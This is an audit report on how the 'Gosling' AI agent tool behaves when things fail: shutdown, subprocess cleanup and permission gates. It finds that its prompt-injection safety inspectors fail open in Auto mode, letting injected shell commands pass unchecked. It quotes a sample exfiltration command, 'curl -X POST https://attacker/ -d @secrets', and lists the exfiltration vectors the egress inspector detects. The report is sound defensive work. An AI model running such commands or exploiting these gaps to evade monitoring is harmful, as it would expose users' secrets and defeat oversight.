# Gosling Audit — Fail-Safe Behavior & Recoverability Lens

Lens: `audit-failsafe-readiness` (umbrella of the failsafe/resilience family).
Domain prefix: `FSR`. Authority: **audit-only / read-only** (per
`docs/cloud/00-orientation.md`). Builds on the shared orientation; does not
re-derive the surface inventory.

Lens focus (as tasked): user-error & misconfiguration handling, missing
dependencies, graceful startup/shutdown, **process termination** (Ctrl-C /
SIGTERM mid-turn — subprocess & temp-file cleanup, partial-write corruption),
and **safe-state on failure** (does a failed security/permission check fail
OPEN?). Priority order honored: startup/config, shutdown/signal, subprocess
lifecycle, permission/security failure modes.

Evidence discipline: every Confirmed claim quotes a `file:line` actually read.
Process-kill / network-outage *manifestations* are capped at `Likely` /
`Plausible` with evidence basis `requires-authorized-drill` unless the code path
is deterministic. No drills were authorized in this run (static trace only).

---

## 1. Failsafe Inventory

| Workflow | Assumption/Dependency | Failure Trigger | Target Safe State | Timeout/Abort | Cleanup | Signal | Recovery |
|---|---|---|---|---|---|---|---|
| CLI one-shot / interactive turn | provider reachable, config valid | Ctrl-C / SIGTERM mid-turn | `fail_visible` + `fail_idempotent` (redeliver-safe) | CancellationToken (`session/mod.rs:1128-1134`) | `kill_on_drop` on children | terminal cancel | rerun (SQLite ACID) |
| Tool inspection / permission gate | inspectors run, classifier endpoint reachable | inspector error / classifier outage | `fail_closed` (require approval / deny) | n/a | n/a | approval prompt / log | operator re-decides |
| MCP / ACP subprocess spawn | child obeys lifecycle | parent SIGKILL, agent eviction, reconfigure | `fail_closed` cleanup (no orphans) | `kill_on_drop`, PDEATHSIG (Linux) | process reap | error log | respawn |
| Session persistence | SQLite file writable | interrupt mid-write | `fail_resumable` (ACID) | busy_timeout 30s | WAL journal | sqlx error | reopen DB |
| goslingd server | port free, TLS material present | SIGINT/SIGTERM | `fail_visible` graceful drain | `graceful_shutdown` | axum handle | boot markers/log | restart |
| Startup config / provider | provider + model configured | missing key/provider | `fail_closed` at startup | n/a | none | error / panic | `gosling configure` |

Safe-state taxonomy values used exactly as defined in
`resilience_mapping.md` §5.

---

## 2. Boundary Map (fail-open vs fail-closed verdicts)

| Boundary | Direction on failure | Verdict |
|---|---|---|
| Base permission decision (no permission result found) | → `needs_approval` | **fail-closed** ✔ (`permission_inspector.rs:102-104`) |
| No permission inspector registered at all | → all `needs_approval` | **fail-closed** ✔ (`agent.rs:2201-2209`) |
| Headless + Approve/SmartApprove mode | → refuse turn | **fail-closed** ✔ (`session/mod.rs:1172-1179`) |
| `detect_read_only_tools` LLM call fails | → `vec![]` (nothing auto-approved) | **fail-closed** ✔ (`permission_judge.rs:181-183`) |
| Security / adversary / egress inspector `inspect()` **errors** | result dropped, tool proceeds | **fail-OPEN** ✗ (`tool_inspection.rs:107-114`) → FSR-GSL-001 |
| Prompt-injection ML classifier network outage | → confidence 0.0 / pattern-only | **fail-OPEN, silent** ✗ (`scanner.rs:298-304`) → FSR-GSL-002 |
| Egress / data-exfiltration inspector (all paths) | always `Allow`, log-only | **no enforcement by design** → FSR-GSL-003 |
| Classifier returns unknown label | → 0.0 (safe) | fail-open (bounded) — noted in FSR-GSL-002 |

Key structural fact driving FSR-GSL-001/002: **inspectors are additive-restriction
only.** `apply_inspection_results_to_permissions` treats `InspectionAction::Allow`
as a no-op (`tool_inspection.rs:249-252`); only `Deny`/`RequireApproval` change the
baseline. The permission inspector supplies the baseline; the security/adversary/
egress inspectors can *only tighten* it. Therefore any failure that makes a
security inspector produce no result (error) or an `Allow` result (classifier
outage) leaves the tool at whatever the baseline was. In **Auto mode** the baseline
is `Allow` for every tool (`permission_inspector.rs:153`), so the security inspector
is the *sole* remaining gate and its silent failure is a true fail-open.

---

## 3. Findings

### FSR-GSL-001: Security/adversary inspector errors are swallowed; tool proceeds unblocked (fail-open in Auto mode)

Severity: High
Confidence: Confirmed (deterministic code path); runtime blast radius Likely
Evidence basis: source-evidenced
Domain: Failsafe

Evidence:
- `crates/gosling/src/tool_inspection.rs:95-115` — `inspect_tools`: on `Err(e)` from an
  inspector, `tracing::error!(...)` then `// Continue with other inspectors even if one
  fails`; the errored inspector contributes **no** `InspectionResult`.
- `crates/gosling/src/tool_inspection.rs:249-252` — `InspectionAction::Allow` is an
  explicit no-op; inspectors can only *add* `Deny`/`RequireApproval`.
- `crates/gosling/src/permission/permission_inspector.rs:153` — `GoslingMode::Auto =>
  InspectionAction::Allow` for every tool (baseline is allow-all).
- `crates/gosling/src/security/adversary_inspector.rs:390-484` and
  `security/security_inspector.rs:59-82` — these inspectors emit `Allow` or a tightening
  action; they never supply a baseline, so their absence = allow.

Observed behavior:
- When the security or adversary inspector's `inspect()` returns `Err` (e.g. its
  `SecurityManager::analyze_tool_requests` propagates an error, ML-init failure surfaced
  as `Err`, or a downstream panic-to-error), its result set is discarded and the loop
  continues. In Auto mode the permission baseline already allowed the tool, so a
  prompt-injected `shell` command that the security inspector *would* have flagged runs
  with no additional gate. The only trace is a single `error!` log line.

Expected boundary:
- `fail_closed`: an errored safety inspector should force `RequireApproval` (or `Deny`)
  for the tools it was supposed to judge, not silently forfeit its veto. A security
  control that cannot run must not be equivalent to a security control that approved.

Failure mechanism:
- The inspection pipeline conflates "inspector said allow" with "inspector failed to
  run." Both yield zero tightening actions, and the additive-only merge cannot
  distinguish them.

Break-it angle:
- Any transient fault inside an inspector (network, lock poisoning, serialization error,
  provider timeout on an LLM-backed inspector) converts, in Auto mode, into silent
  approval of whatever the model requested — precisely the state prompt-injection
  defenses exist to prevent.

Impact:
- Silent bypass of the prompt-injection / adversary safety controls for the exact tool
  calls they were meant to gate, in the mode (Auto) where they are the only gate.

Operational impact:
- Blast radius: Local (workstation, per `SECURITY.md` threat model) → up to Cross-system
  via egressing shell commands. Side-effect class: process / network / file.
  Reversibility: irreversible (arbitrary command executed). Operator visibility: log-only.
  Rerun safety: unknown.

Resilience mapping:
- Phase: withstand. Objective(s): constrain, understand. Safe state: fail_closed.

Failure analysis (FMECA row):
- Item/workflow: tool-inspection pipeline → tool execution.
- Failure mode: safety inspector error dropped; tool executes unjudged.
- Likely cause: additive-only merge treats "no result" as "allow"; error branch has no
  fail-closed fallback.
- Operational phase: normal_run.
- Local effect: one inspector's veto lost.
- Workflow effect: tool call proceeds without the intended safety gate.
- System/operator effect: in Auto mode, arbitrary/malicious command runs; operator
  believes protection is active.
- Detection method: log (error line only). Detection latency: delayed.
- Operator visible: false (no UI/approval surface). Compensating provision: none.

Criticality:
- Likelihood: plausible (any inspector fault triggers it; Auto mode is a common headless
  choice). Detectability: logged.
- Driving axis: irreversible + effectively silent to the operator → treat as
  High-attention despite requiring an inspector fault.

Adjacent failure modes:
- FSR-GSL-002 (same fail-open reached via classifier outage rather than inspector error).

Recommended mitigation:
- Remediation patterns: `degraded_mode_contract`, `operator_action_message`.
- Minimal repair: in `inspect_tools`, on inspector `Err`, synthesize a fail-closed
  `RequireApproval` result for every tool that inspector was responsible for (keyed by
  request id), tagged with the inspector name and the error, instead of dropping.
- Local guardrail: a policy flag `security_inspector_failure = require_approval | deny`
  (default require_approval), never silent-allow.
- Behavior test: register a stub security inspector that returns `Err`; assert every
  shell request lands in `needs_approval`/`denied`, not `approved`, under Auto mode.

Implementation assessment:
- Complexity: workflow_protocol. Cost: S. Cost drivers: modules, tests. Nominal agent:
  codex.
- Rationale: bounded change at one merge site plus a deterministic regression test; the
  hard part is the policy decision (default), which is a small governance call.

Validation:
- Assert the safe state: with a failing security inspector, no shell tool reaches the
  approved set in Auto mode.

Non-goals:
- Do not redesign the inspector trait or the additive-merge model in this slice.

---

### FSR-GSL-002: Prompt-injection ML classifier outage degrades to "safe" silently (degraded-lying)

Severity: Medium
Confidence: Confirmed (code path); runtime effect Likely
Evidence basis: source-evidenced
Domain: Failsafe

Evidence:
- `crates/gosling/src/security/scanner.rs:298-304` — `scan_with_classifier`: on
  `classifier.classify(...)` `Err`, `tracing::warn!` then returns `None`.
- `crates/gosling/src/security/scanner.rs:245-254` — prompt-context path folds a failed
  classifier via `result.unwrap_or(0.0).max(acc)` → outage contributes **0.0** (safe).
- `crates/gosling/src/security/scanner.rs:200-222` — command path: on classifier `None`,
  falls back to regex patterns only (partial detection).
- `crates/gosling/src/security/classification_client.rs:159-171` — network/5xx errors
  return `Err` (propagated to the swallow above); `:206-217` — unknown label defaults to
  `0.0` ("defaulting to safe") with only a `warn!`.

Observed behavior:
- With `SECURITY_*_CLASSIFIER_ENABLED` on and the endpoint unreachable (connection
  refused, timeout — the client sets a 5s timeout at `classification_client.rs:52`),
  ML scoring silently yields 0.0 for conversation context and pattern-only for the
  command. The scan reports `is_malicious = false` for anything the regex patterns miss.
  No health/status surface reports that the ML control is down; only a `warn` log.

Expected boundary:
- `fail_degraded` **with an explicit, operator-visible contract** (e.g. mark the scan
  `scanned:false / ml_unavailable:true`, and in Auto mode escalate affected shell calls
  to `RequireApproval`). Currently the degraded state is reported as a clean pass.

Failure mechanism:
- `Result → Option → unwrap_or(0.0)` erases the distinction between "classifier says
  safe" and "classifier could not run." The `ScanResult.scanned` flag stays `true`, so
  downstream cannot tell the ML tier was skipped.

Break-it angle:
- A single misconfigured/unreachable classifier endpoint (`SECURITY_ML_MODEL_MAPPING`
  pointing at a dead host, expired token → 401 → `Err`) disables the ML safety tier for
  the whole session while every scan reports "No security threats detected."

Impact:
- The advertised ML prompt-injection/command-injection control silently reduces to the
  regex pattern set (or nothing, for conversation context) during any classifier outage,
  with no honest degraded signal.

Operational impact:
- Blast radius: Workflow (whole session's scanning). Side-effect class: user-visible
  (false "safe" verdict) → process/network via the un-gated command. Reversibility:
  irreversible (command executed). Operator visibility: log-only. Rerun safety: unknown.

Resilience mapping:
- Phase: withstand. Objective(s): continue, understand. Safe state: fail_degraded.

Failure analysis (FMECA row):
- Item/workflow: `PromptInjectionScanner` ML tier.
- Failure mode: classifier outage scored as 0.0 / pattern-only; reported as safe.
- Likely cause: error swallowed to `None` then `unwrap_or(0.0)`; `scanned` flag not
  cleared.
- Operational phase: normal_run (dependency degraded).
- Local effect: ml_confidence dropped. Workflow effect: threshold rarely tripped.
- System/operator effect: injected command passes the ML gate; operator sees "no threats."
- Detection method: log (warn). Detection latency: delayed. Operator visible: false.
- Compensating provision: partial (regex patterns for command path only); none for
  conversation-context path.

Criticality:
- Likelihood: plausible (any endpoint/token fault; endpoints are remote). Detectability:
  logged (warn — weaker than error).
- Driving axis: silent-to-operator + irreversible; ranks with FSR-GSL-001.

Adjacent failure modes:
- FSR-GSL-001 (broader inspector-error fail-open). Same safe-state target.

Recommended mitigation:
- Remediation patterns: `degraded_mode_contract`, `circuit_breaker`,
  `operator_action_message`.
- Minimal repair: thread an `ml_unavailable` signal out of `scan_with_classifier`; set
  `ScanResult.scanned = false` and, when the ML tier was requested but unavailable,
  escalate to `RequireApproval` for shell tools rather than emitting a clean pass.
- Behavior test: point the classifier at a closed local port; assert the scan reports
  degraded (not `is_malicious:false / scanned:true`) and shell calls require approval.

Implementation assessment:
- Complexity: workflow_protocol. Cost: S. Cost drivers: modules, tests. Nominal agent:
  codex.
- Rationale: localized to the scanner plumbing plus the inspector escalation policy.

Validation:
- Assert the degraded state is surfaced and enforced, not that a log line exists.

Non-goals:
- Do not add retry/backoff to the classifier in this slice (separate `retry_budget` work).

---

### FSR-GSL-003: Egress / data-exfiltration inspector is detection-only with no operator-visible degraded contract

Severity: Low
Confidence: Confirmed
Evidence basis: source-evidenced
Domain: Failsafe

Evidence:
- `crates/gosling/src/security/egress_inspector.rs:369-383` — every detected egress
  destination yields `InspectionAction::Allow` with `confidence: 0.0`; the only effect is
  `tracing::info!(security.action = "LOG", ...)` at `:356-367`.

Observed behavior:
- The egress inspector recognizes exfiltration vectors (curl POST, scp/rsync out, s3/gcs
  put, docker push, npm/cargo publish, netcat, etc.) and **never** blocks or prompts —
  it emits a structured log line and allows. It cannot fail open (it never gates), but it
  is presented (per orientation §5.2) among "the claimed safety controls."

Expected boundary:
- If the design intent is detect-only, that is an honest `fail_degraded` *contract* —
  but the contract must be visible to the operator (this control observes, it does not
  enforce). Today the "control" is indistinguishable, at the UI, from an enforcing gate;
  an operator may over-trust it.

Failure mechanism:
- No enforcement branch and no operator-facing surface beyond a log an operator must
  actively tail.

Break-it angle:
- A prompt-injected `curl -X POST https://attacker/ -d @secrets` is logged and allowed;
  in Auto mode nothing else gates it either (see FSR-GSL-001).

Impact:
- Over-trust: the presence of an "egress inspector" implies exfiltration is contained
  when it is only recorded.

Operational impact:
- Blast radius: Workflow. Side-effect class: network. Reversibility: irreversible.
  Operator visibility: log-only. Rerun safety: n/a.

Resilience mapping:
- Phase: withstand. Objective(s): understand. Safe state: fail_degraded (must be honest).

Failure analysis (FMECA row):
- Item/workflow: egress inspector. Failure mode: exfiltration allowed, only logged.
  Likely cause: intentional detect-only design without a stated contract.
  Operational phase: normal_run. Local effect: log emitted. Workflow effect: command
  runs. System/operator effect: possible data exfiltration, believed contained.
  Detection method: log. Detection latency: delayed. Operator visible: false.
  Compensating provision: none (detection only).

Criticality:
- Likelihood: plausible. Detectability: logged.

Adjacent failure modes:
- FSR-GSL-001 (in Auto mode nothing else gates these either). Route enforcement-vs-signal
  depth to `audit-operator-signal` and the security-llm lens.

Recommended mitigation:
- Remediation patterns: `degraded_mode_contract`, `operator_action_message`.
- Minimal repair: either (a) escalate high-risk *outbound* egress to `RequireApproval`,
  or (b) document and surface the detect-only contract in the UI/security posture so it
  is not mistaken for an enforcing gate.
- Behavior test: assert the chosen contract (block-on-outbound, or a visible
  "monitoring-only" status), not just the log line.

Implementation assessment:
- Complexity: governance_decision (enforce vs. observe) then local_guardrail. Cost: S.
  Cost drivers: docs, operator_training. Nominal agent: human-owner (policy) then codex.

Validation:
- Assert the declared contract holds.

Non-goals:
- Do not build a full egress allow/deny policy engine in this slice.

---

### FSR-GSL-004: macOS hard-SIGKILL of parent orphans MCP/ACP child subprocesses

Severity: Medium
Confidence: Likely (documented gap; manifestation needs a drill)
Evidence basis: requires-authorized-drill
Domain: Failsafe

Evidence:
- `crates/gosling/src/subprocess.rs:50-65` — `configure_subprocess` sets
  `kill_on_drop(true)`, `process_group(0)` (unix), and `PR_SET_PDEATHSIG` (Linux only).
  The in-file comment states: *"macOS has no in-process equivalent, so a hard parent
  SIGKILL can still orphan children."*
- `crates/gosling/tests/subprocess_cleanup.rs:44-75` — Linux parent-death cleanup is
  test-proven (`#![cfg(target_os = "linux")]`); no macOS equivalent exists.

Observed behavior:
- On normal drop/exit the child is reaped (`kill_on_drop`), and on abnormal Linux parent
  death PDEATHSIG reaps it. But `kill_on_drop` relies on `Drop` running, which SIGKILL
  (uncatchable) skips; on macOS there is no PDEATHSIG backstop, so a `kill -9` of the
  gosling parent leaves spawned MCP servers / ACP CLI bridges running.

Expected boundary:
- `fail_closed` cleanup: spawned children terminate when the parent dies, on all
  supported platforms.

Failure mechanism:
- Platform gap: the only abnormal-death reaper is Linux-specific.

Break-it angle:
- `kill -9 <gosling-pid>` on macOS during an active session leaves orphaned `npx`/CLI
  MCP subprocesses (and their held ports/tempdirs) until manual cleanup or reboot.

Impact:
- Orphaned subprocesses on macOS after hard kill / crash: leaked resources, held ports,
  possible duplicate servers on rerun.

Operational impact:
- Blast radius: Local. Side-effect class: process. Reversibility: compensatable (manual
  kill). Operator visibility: silent. Rerun safety: unsafe (port/name collisions).

Resilience mapping:
- Phase: recover. Objective(s): constrain, reconstitute. Safe state: fail_closed (cleanup).

Failure analysis (FMECA row):
- Item/workflow: subprocess lifecycle (MCP/ACP). Failure mode: orphaned children on
  macOS hard kill. Likely cause: no PDEATHSIG/process-supervisor equivalent on macOS.
  Operational phase: shutdown (abnormal). Local effect: child survives parent. Workflow
  effect: leaked server/port. System/operator effect: resource leak, rerun collision.
  Detection method: none (user notices via `ps`). Detection latency: unknown.
  Operator visible: false. Compensating provision: Linux PDEATHSIG (not macOS);
  kill_on_drop (not SIGKILL).

Criticality:
- Likelihood: plausible (crash/OOM-kill/force-quit are ordinary on a workstation).
  Detectability: silent.

Adjacent failure modes:
- Shell tool grandchildren: `shell.rs:664-668` uses `kill_on_drop` only (no
  `process_group`), so a cancelled shell command's *grandchildren* may survive even on
  Linux (immediate child is killed, its forks are not reaped as a group). Cross-reference
  for `audit-resource-lifecycle`.

Recommended mitigation:
- Remediation patterns: `child_process_supervisor`.
- Minimal repair: on macOS, add a supervisor that tracks child PIDs and reaps them via a
  parent-monitoring watchdog (e.g. kqueue `NOTE_EXIT` on the parent, or a wrapper that
  polls `getppid`). For the shell tool, prefer `process_group(0)` + group-kill so forks
  are reaped.
- Behavior test: macOS integration test mirroring `subprocess_cleanup.rs` — `kill -9` the
  parent, assert the child PID is gone within a deadline.

Implementation assessment:
- Complexity: cross_process_coordination. Cost: M. Cost drivers: modules, runtime_
  verification (platform-specific). Nominal agent: codex (with a macOS runner).

Validation:
- Assert child absence after parent SIGKILL on macOS, not merely that code compiles.

Non-goals:
- Do not change the Linux path (already proven).

---

### FSR-GSL-005: Missing provider/model in planner path aborts via `.expect()` panic instead of graceful refusal

Severity: Low
Confidence: Confirmed
Evidence basis: source-evidenced
Domain: Failsafe

Evidence:
- `crates/gosling-cli/src/session/mod.rs:2150` — `.expect("No provider configured. Run
  'gosling configure' first")`; `:2160` — `.expect("No model configured. ...")`.
- `crates/gosling-cli/src/commands/configure.rs:1577` — `.expect("No provider configured.
  Please set model provider first")`.
- Contrast (graceful): `crates/gosling-cli/src/session/builder.rs:241,532` —
  `output::render_error("No provider configured. Run 'gosling configure' first.")`.

Observed behavior:
- The planner/configure paths `panic!` (via `.expect`) when provider/model is unset,
  producing a Rust panic + backtrace rather than the clean, actionable error the builder
  path emits. This is fail-*closed* (no side effects occur first) but the operator signal
  is a panic, not a `fail_visible` message.

Expected boundary:
- `fail_visible`: exit nonzero with the actionable message, no panic/backtrace noise.

Failure mechanism:
- Inconsistent handling of the same missing-config condition — some paths render an error,
  these `.expect()`.

Impact:
- Poorer operator experience and (with `RUST_BACKTRACE`) noisy output; a `likely`
  first-run mistake surfaces as a crash.

Operational impact:
- Blast radius: Local. Side-effect class: none. Reversibility: reversible. Operator
  visibility: UI-visible (panic text). Rerun safety: safe.

Resilience mapping:
- Phase: anticipate. Objective(s): prevent_avoid, understand. Safe state: fail_closed
  (reached ungracefully; target presentation `fail_visible`).

Failure analysis (FMECA row):
- Item/workflow: planner/configure startup. Failure mode: panic on missing provider.
  Likely cause: `.expect()` instead of error return. Operational phase: configure/startup.
  Local effect: panic. Workflow effect: process aborts. System/operator effect: crash
  message instead of guidance. Detection method: exception. Detection latency: immediate.
  Operator visible: true. Compensating provision: message text is present in the panic.

Criticality:
- Likelihood: likely (first-run / unconfigured is common). Detectability: obvious.

Adjacent failure modes: none.

Recommended mitigation:
- Remediation patterns: `startup_preflight`, `operator_action_message`.
- Minimal repair: replace `.expect()` with `anyhow::bail!(...)` / `render_error` + nonzero
  exit, matching `builder.rs`.
- Behavior test: run the planner path unconfigured; assert nonzero exit + message, no
  panic.

Implementation assessment:
- Complexity: local_guardrail. Cost: XS. Cost drivers: tests. Nominal agent: codex.

Validation:
- Assert exit code + message, not a panic.

Non-goals:
- Do not centralize all config validation in this slice.

---

## 4. Non-Findings (boundaries checked and held)

- **Linux parent-death subprocess cleanup — `safe-stop`.** `subprocess.rs:57-63`
  (`kill_on_drop` + `process_group(0)` + PDEATHSIG) is **test-proven** by
  `tests/subprocess_cleanup.rs:44-75` (child exits within 5s of parent death). Grade 3.
- **Session persistence interruption/corruption — `safe-stop` / `fail_resumable`.**
  Sessions are SQLite via sqlx with `journal_mode(WAL)`, `synchronous(Normal)`,
  `busy_timeout(30s)` (`session_manager.rs:746-758`). Interrupted writes are handled by
  the WAL journal (ACID); no naive file-overwrite corruption path (SC-INT/SC-COR). The
  `synchronous(Normal)` choice trades a small last-commit durability window for speed and
  is documented in-code — acceptable and honest. Non-finding.
- **Base permission gate — `fail_closed`.** Missing permission result →
  `needs_approval` (`permission_inspector.rs:102-104`); no permission inspector at all →
  all `needs_approval` (`agent.rs:2201-2209`). SC-USR/SC-CFG safe-stop.
- **Headless + Approve/SmartApprove — `fail_closed`.** Refuses the turn with an
  actionable message rather than auto-approving (`session/mod.rs:1167-1179`).
- **`detect_read_only_tools` LLM failure — `fail_closed`.** Returns `vec![]`, so nothing
  is auto-classified read-only on provider failure (`permission_judge.rs:160-166,181-183`).
- **CLI Ctrl-C mid-turn — `safe-stop`.** A spawned task cancels the `CancellationToken`
  on `ctrl_c`, wrapped in `AbortOnDropHandle` (`session/mod.rs:1128-1134`); the agent loop
  checks `is_token_cancelled` (`agent.rs:2254`); shell children carry `kill_on_drop`
  (`shell.rs:667`). Immediate-child cleanup on Linux is sound (grandchildren caveat in
  FSR-GSL-004).
- **goslingd graceful shutdown — `safe-stop`.** SIGINT/SIGTERM select →
  `handle.graceful_shutdown` / `with_graceful_shutdown` (`server/.../agent.rs:19-30,
  96-101,134`). Boot markers give startup progress signal.
- **Extension reconfigure failure — `safe-stop`.** A failed replacement client preserves
  the old extension (asserted by `extension_manager.rs:2768-2776`) rather than dropping a
  working one.
- **Subprocess process-group isolation — intentional.** Children are put in their own
  process group so a terminal Ctrl-C does not directly signal them
  (`subprocess.rs:60-61`); cancellation is instead routed through the token — a
  deliberate, coherent design.

---

## 5. Scenario Records (appendix)

```yaml
- scenario: SC-NET (security inspector inspect() errors)
  injection: static-trace
  predicted_safe_state: fail_closed
  observed_behavior: unsafe-continue   # Auto mode: tool runs unjudged
  evidence: [tool_inspection.rs:107-114, tool_inspection.rs:249-252, permission_inspector.rs:153]
  residue: none
  disposition: FSR-GSL-001
- scenario: SC-NET/SC-DEG (ML classifier endpoint unreachable)
  injection: static-trace
  predicted_safe_state: fail_degraded (honest)
  observed_behavior: degraded-lying    # scored 0.0 / pattern-only, reported "safe/scanned:true"
  evidence: [scanner.rs:298-304, scanner.rs:245-254, classification_client.rs:159-171]
  residue: none
  disposition: FSR-GSL-002
- scenario: SC-DEG (egress inspector on exfiltration command)
  injection: static-trace
  predicted_safe_state: fail_degraded (honest contract) or fail_manual_hold
  observed_behavior: degraded-lying    # allowed + logged, presented as a control
  evidence: [egress_inspector.rs:369-383, egress_inspector.rs:356-367]
  residue: none
  disposition: FSR-GSL-003
- scenario: SC-INT (SIGKILL parent on macOS with MCP children)
  injection: not-executed (requires-authorized-drill)
  predicted_safe_state: fail_closed (cleanup)
  observed_behavior: unsafe-continue   # orphaned children (documented gap)
  evidence: [subprocess.rs:50-65, subprocess_cleanup.rs:1]
  residue: orphaned subprocesses, held ports/tempdirs
  disposition: FSR-GSL-004
- scenario: SC-INT (SIGINT parent on Linux with MCP children)
  injection: static-trace (backed by existing test)
  predicted_safe_state: fail_closed (cleanup)
  observed_behavior: safe-stop
  evidence: [subprocess.rs:57-63, subprocess_cleanup.rs:44-75]
  residue: none
  disposition: non-finding
- scenario: SC-INT (interrupt mid session-write)
  injection: static-trace
  predicted_safe_state: fail_resumable
  observed_behavior: safe-stop         # SQLite WAL ACID
  evidence: [session_manager.rs:746-758]
  residue: none
  disposition: non-finding
- scenario: SC-CFG/SC-DEP (missing provider at startup)
  injection: static-trace
  predicted_safe_state: fail_closed / fail_visible
  observed_behavior: safe-stop (ungraceful — panic on planner path)
  evidence: [session/mod.rs:2150,2160, builder.rs:241,532]
  residue: none
  disposition: FSR-GSL-005
- scenario: SC-USR (headless + Approve mode)
  injection: static-trace
  predicted_safe_state: fail_closed
  observed_behavior: safe-stop
  evidence: [session/mod.rs:1167-1179]
  residue: none
  disposition: non-finding
```

---

## 6. Readiness Scorecard

Static-only evidence caps capabilities at 2 (grade 3 requires a test/drill).

| Subsystem | Families traced | Worst classification | Det | Con | Rec | Sig | Grade | Driving evidence |
|---|---|---|---|---|---|---|---|---|
| Tool inspection / safety gate | USR CFG NET DEG | unsafe-continue (SC-NET) / degraded-lying | 1 | 1 | 2 | 1 | **not-ready** | error dropped `tool_inspection.rs:107-114`; classifier→0.0 `scanner.rs:245-254` |
| Permission baseline gate | USR CFG DEP | safe-stop | 2 | 2 | 2 | 2 | **ready** | fail-closed defaults `permission_inspector.rs:102-104`, `agent.rs:2201-2209` |
| MCP/ACP subprocess lifecycle | INT | unsafe-continue (SC-INT, macOS) | 2 | 2 | 3(Linux)/1(macOS) | 1 | **conditional** | proven Linux `subprocess_cleanup.rs`; macOS gap `subprocess.rs:56` — *condition: Linux only* |
| Session persistence (SQLite) | INT COR | safe-stop | 2 | 2 | 2 | 2 | **ready** | WAL+busy_timeout `session_manager.rs:746-758` |
| CLI turn (Ctrl-C/SIGTERM) | INT USR | safe-stop | 2 | 2 | 2 | 2 | **ready** | token cancel `session/mod.rs:1128-1134`; kill_on_drop `shell.rs:667` |
| goslingd server | CFG INT | safe-stop | 2 | 2 | 2 | 2 | **ready** | graceful shutdown `server/.../agent.rs:96-101,134` |
| Startup config/provider | CFG DEP | safe-stop (ungraceful) | 2 | 2 | 2 | 2 | **conditional** | panic vs render_error split `session/mod.rs:2150` — *condition: cosmetic only* |

Attention order (per `criticality_scoring.md` ranking): **Tool inspection / safety
gate** first (irreversible + operator-silent fail-open, `not-ready`), then **MCP/ACP
subprocess lifecycle** (silent, platform-conditional), then the two Low findings.
Driving axis for the top rank: fail-open of the *sole* Auto-mode safety gate, silent
to the operator.

---

## 7. Residual Risk Register

| ID | Retained risk | Control in place | Why retained | Owner decision needed |
|---|---|---|---|---|
| RR-FSR-01 | macOS orphaned MCP/ACP children on hard kill (FSR-GSL-004) | Linux PDEATHSIG; `kill_on_drop` for normal exit | No in-process macOS PDEATHSIG equivalent; needs a watchdog | Accept platform gap or fund macOS supervisor |
| RR-FSR-02 | SQLite `synchronous=Normal` last-commit durability window | WAL journal (no corruption) | Deliberate perf tradeoff, documented | Confirm acceptable for session data |
| RR-FSR-03 | Egress detect-only posture (FSR-GSL-003) | Structured egress logs | Product decision: observe vs enforce | Decide enforce-outbound vs. document monitoring-only |

---

## 8. Validation Limits

- **Static trace only.** No process-kill, network-outage, or corruption drills were
  authorized. All runtime *manifestations* (orphaned children on macOS, classifier-outage
  fail-open in a live session, panic output) are capped at `Likely`/`Plausible` per the
  confidence ceilings and are marked `requires-authorized-drill` where relevant.
- **Not run live.** The app was not built or executed (per orientation §7 deferral);
  findings derive from reading source.
- **Scope sampling.** This lens prioritized startup/config, shutdown/signal, subprocess
  lifecycle, and permission/security failure modes. Areas touched only lightly and routed
  to siblings: full dependency-SPF register and per-class absence walks
  (`audit-dependency-criticality`), crash-point idempotency enumeration and rerun
  duplication (`audit-recovery-idempotency`), operator-signal quality/heartbeat depth
  (`audit-operator-signal`), and retry-storm/cascade amplification of unbounded classifier
  or provider calls (`audit-dataflow-cascade`).
- **Not reviewed this pass:** OAuth device/callback flow interruption
  (`oauth/`), context-management truncation under failure (`context_mgmt/`), import/nostr
  session ingestion corruption paths (`session/import_formats/`, `nostr_share.rs`),
  provider-level retry/backoff/timeout matrices across all 15+ providers, and the desktop
  Electron shutdown/child-cleanup path (`ui/desktop`). Absence of review here is a
  reported fact, not a clean bill.
- **Adversary inspector internals** (`adversary_inspector.rs`) were confirmed additive-
  restriction-only but their detection logic/thresholds were not audited for correctness
  (out of failsafe scope; see the security-llm lens).
